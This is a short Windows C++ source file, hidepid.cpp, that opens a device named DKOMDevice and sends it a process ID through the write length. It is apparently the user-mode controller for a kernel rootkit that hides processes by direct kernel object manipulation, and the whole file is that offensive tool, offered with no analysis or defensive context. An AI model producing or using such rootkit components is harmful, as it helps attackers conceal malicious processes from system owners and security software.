// hidepid.cpp
//

#include <windows.h>


int main(int argc, char* argv[])
{
  HANDLE hFile;
  DWORD dwReturn;
  if (argc < 2) return 1;
  if ((hFile = CreateFile("\\\\.\\DKOMDevice", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0,NULL)) == INVALID_HANDLE_VALUE) return 1;
  (void) WriteFile(hFile, "", atoi(argv[1]), &dwReturn, NULL); 
  (void) CloseHandle(hFile);
  return 0;
}

